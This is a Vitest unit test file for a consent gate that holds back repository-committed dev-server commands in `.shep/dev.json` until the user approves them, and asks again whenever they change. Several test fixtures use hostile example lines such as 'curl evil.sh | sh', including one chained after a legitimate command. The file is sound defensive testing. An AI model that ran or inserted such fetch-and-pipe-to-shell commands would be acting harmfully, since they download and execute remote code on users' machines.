// @vitest-environment node

/**
 * `.shep/dev.json` consent gate unit tests (C5).
 *
 * The reader's own header already called this file "UNTRUSTED input: it
 * arrives via `git pull` from anyone with commit access", and then handed
 * `command`, `setupCommands` and `packageManager` — after a `trim()` and
 * nothing else — to three `shell: true` spawns, one of them `detached: true`
 * so it outlives shep. Tier zero also outranks the whole detector chain, so a
 * repository whose real dev server is `npm run dev` could silently redirect
 * the "start dev server" button.
 *
 * A committed command is therefore treated as a REQUEST, approved once per
 * repository and command fingerprint, and re-approved whenever the command
 * changes.
 *
 * TDD Phase: RED → GREEN
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdirSync, mkdtempSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { removeDirWithRetry } from '@tests/helpers/remove-dir.helper.js';
import {
  computeRepoDevConfigFingerprint,
  createRepoDevConfigApprovalGate,
} from '@/infrastructure/services/deployment/repo-dev-config-approval.js';
import {
  approveRepoDevConfig,
  readRepoDevConfig,
  readValidatedRepoDevConfig,
} from '@/infrastructure/services/deployment/repo-dev-config-reader.js';

const APPROVE_ALL = { isApproved: (): boolean => true };
const APPROVE_NONE = { isApproved: (): boolean => false };

let workDir: string;
let repoDir: string;
let savedShepHome: string | undefined;

function writeDevConfig(document: Record<string, unknown>): void {
  mkdirSync(join(repoDir, '.shep'), { recursive: true });
  writeFileSync(join(repoDir, '.shep', 'dev.json'), JSON.stringify(document), 'utf-8');
}

beforeEach(() => {
  workDir = mkdtempSync(join(tmpdir(), 'shep-devcfg-approval-'));
  repoDir = join(workDir, 'repo');
  mkdirSync(repoDir, { recursive: true });
  savedShepHome = process.env.SHEP_HOME;
  process.env.SHEP_HOME = join(workDir, '.shep');
});

afterEach(() => {
  if (savedShepHome === undefined) delete process.env.SHEP_HOME;
  else process.env.SHEP_HOME = savedShepHome;
  removeDirWithRetry(workDir);
});

describe('computeRepoDevConfigFingerprint', () => {
  const base = { command: 'make dev', cwd: '/repo', setupCommands: [] as string[] };

  it('is stable for the same executable content', () => {
    expect(computeRepoDevConfigFingerprint(base)).toBe(computeRepoDevConfigFingerprint(base));
  });

  it.each([
    ['command', { ...base, command: 'make dev --evil' }],
    ['cwd', { ...base, cwd: '/repo/services' }],
    ['setupCommands', { ...base, setupCommands: ['curl evil.sh | sh'] }],
    ['packageManager', { ...base, packageManager: 'npm' }],
  ])('changes when %s changes', (_label, changed) => {
    expect(computeRepoDevConfigFingerprint(changed)).not.toBe(
      computeRepoDevConfigFingerprint(base)
    );
  });

  it('ignores fields that are not executed', () => {
    // Bound to a variable rather than written inline: the point is that a
    // document carrying descriptive fields fingerprints the same, and an
    // object literal would be rejected by the excess-property check before
    // the assertion could say so.
    const withDescriptiveFields = { ...base, language: 'Go', expectedPort: 8080 };

    expect(computeRepoDevConfigFingerprint(withDescriptiveFields)).toBe(
      computeRepoDevConfigFingerprint(base)
    );
  });
});

describe('readRepoDevConfig consent gate', () => {
  it('refuses consent if the command changed since its fingerprint was reviewed', () => {
    writeDevConfig({ command: 'make dev' });
    const reviewed = computeRepoDevConfigFingerprint(readValidatedRepoDevConfig(repoDir)!);
    writeDevConfig({ command: 'make different' });

    expect(approveRepoDevConfig(repoDir, reviewed)).toBe(false);
    expect(readRepoDevConfig(repoDir)).toBeNull();
  });

  it('withholds an unapproved command', () => {
    writeDevConfig({ command: 'make dev' });

    expect(readRepoDevConfig(repoDir, APPROVE_NONE)).toBeNull();
  });

  it('returns the config once approved', () => {
    writeDevConfig({ command: 'make dev' });

    expect(readRepoDevConfig(repoDir, APPROVE_ALL)).toMatchObject({ command: 'make dev' });
  });

  it('withholds by default — no gate argument means the persisted store', () => {
    writeDevConfig({ command: 'make dev' });

    expect(readRepoDevConfig(repoDir)).toBeNull();
  });

  it('honours an approval recorded through approveRepoDevConfig', () => {
    writeDevConfig({ command: 'make dev' });

    const approved = approveRepoDevConfig(repoDir);

    expect(approved).toBe(true);
    expect(readRepoDevConfig(repoDir)).toMatchObject({ command: 'make dev' });
  });

  it('requires re-approval after the command changes', () => {
    writeDevConfig({ command: 'make dev' });
    approveRepoDevConfig(repoDir);

    writeDevConfig({ command: 'make dev && curl evil.sh | sh' });

    expect(readRepoDevConfig(repoDir)).toBeNull();
  });

  it('requires re-approval after a setup command is added', () => {
    writeDevConfig({ command: 'make dev' });
    approveRepoDevConfig(repoDir);

    writeDevConfig({ command: 'make dev', setupCommands: ['curl evil.sh | sh'] });

    expect(readRepoDevConfig(repoDir)).toBeNull();
  });

  it('does not approve one repository by approving another', () => {
    writeDevConfig({ command: 'make dev' });
    approveRepoDevConfig(repoDir);

    const otherRepo = join(workDir, 'other-repo');
    mkdirSync(join(otherRepo, '.shep'), { recursive: true });
    writeFileSync(
      join(otherRepo, '.shep', 'dev.json'),
      JSON.stringify({ command: 'make dev' }),
      'utf-8'
    );

    expect(readRepoDevConfig(otherRepo)).toBeNull();
  });

  it('keeps an approval across gate instances', () => {
    writeDevConfig({ command: 'make dev' });
    approveRepoDevConfig(repoDir);

    const fresh = createRepoDevConfigApprovalGate();

    expect(readRepoDevConfig(repoDir, fresh)).toMatchObject({ command: 'make dev' });
  });

  it('rejects an invalid document before asking about consent', () => {
    writeDevConfig({ command: '   ' });

    expect(approveRepoDevConfig(repoDir)).toBe(false);
    expect(readRepoDevConfig(repoDir, APPROVE_ALL)).toBeNull();
  });
});

describe.skipIf(process.platform === 'win32')('approval store permissions', () => {
  it('writes the approval file owner-only', () => {
    writeDevConfig({ command: 'make dev' });
    approveRepoDevConfig(repoDir);

    const storePath = join(process.env.SHEP_HOME as string, 'approvals', 'repo-dev-config.json');
    expect(statSync(storePath).mode & 0o777).toBe(0o600);
  });
});
